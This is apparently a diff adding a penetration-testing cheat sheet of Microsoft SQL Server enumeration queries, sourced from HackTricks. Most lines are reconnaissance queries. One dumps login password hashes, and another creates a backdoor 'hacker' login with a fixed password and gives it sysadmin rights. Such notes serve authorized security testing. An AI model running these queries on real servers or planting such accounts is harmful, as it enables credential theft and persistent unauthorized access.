@@ -1,0 +1,39 @@
+https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
+
+# Get version
+select @@version;
+# Get user
+select user_name();
+# Get databases
+SELECT name FROM master.dbo.sysdatabases;
+# Use database
+USE master
+
+#Get table names
+SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
+#List Linked Servers
+EXEC sp_linkedservers
+SELECT * FROM sys.servers;
+#List users
+select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+#Create user with sysadmin privs
+CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
+EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
+
+# Get all the users and roles
+select * from sys.database_principals;
+## This query filters a bit the results
+select name,
+       create_date,
+       modify_date,
+       type_desc as type,
+       authentication_type_desc as authentication_type,
+       sid
+from sys.database_principals
+where type not in ('A', 'R')
+order by name;
+
+## Both of these select all the users of the current database (not the server).
+## Interesting when you cannot acces the table sys.database_principals
+EXEC sp_helpuser
+SELECT * FROM sysusers
